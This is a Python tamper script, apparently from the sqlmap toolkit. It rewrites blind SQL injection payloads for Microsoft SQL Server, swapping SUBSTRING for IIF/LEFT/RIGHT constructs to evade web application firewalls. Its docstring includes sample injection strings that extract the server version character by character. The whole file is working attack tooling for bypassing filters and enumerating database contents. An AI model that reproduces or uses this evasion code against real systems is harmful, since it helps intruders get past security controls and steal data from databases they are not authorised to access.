#!/usr/bin/env python

import re

def tamper(payload, **kwargs):
	"""
	Replacing SUBSTRING function by utilizing LEFT and RIGHT function.
	Due to LEFT or RIGHT function will return infinite string.
	Therefore, we use 2147483647 (2 GB) which is maximum length of string can be stored on Microsoft SQL.

	Tested against:
        * Microsoft SQL Server 2012

	Notes:
        * Useful in case SUBSTRING function is filtered (WAF and/or some kind of security control)

	>>>#length calculation
	>>>tamper('3 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(LEN(@@VERSION))) AS NVARCHAR(4000)),CHAR(32))),1,1))>51')
	"3 AND UNICODE(IIF(1<=LEN(LEFT((SELECT ISNULL(CAST(LTRIM(STR(LEN(@@VERSION))) AS NVARCHAR(4000)),CHAR(32))),2147483647)),RIGHT(LEFT((SELECT ISNULL(CAST(LTRIM(STR(LEN(@@VERSION))) AS NVARCHAR(4000)),CHAR(32))),1),1),''))>51"

	>>>#enumeration
	>>>tamper('3 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))),2,1))>96')
	"3 AND UNICODE(IIF(2<=LEFT(LEN((SELECT ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))),2147483647),RIGHT(LEFT((SELECT ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))),2),1),''))>96"
	"""
	retVal = ''
	is_find_len = re.search(r'.*SUBSTRING.*LEN', payload)
	#found length calculation query, especially, it's appear when --threads was specified
	if is_find_len:
		retVal = re.sub(r'(.*)SUBSTRING(.*)\,(\d)\,(\d)(.*)', r"\1IIF(\3<=LEN(LEFT\2,2147483647)),RIGHT(LEFT\2,\3),\4),''\5", payload)
	else:
		retVal = re.sub(r'(.*)SUBSTRING(.*)\,(\d)\,(\d)(.*)', r"\1IIF(\3<=LEFT(LEN\2),2147483647),RIGHT(LEFT\2,\3),\4),''\5", payload)
	return retVal
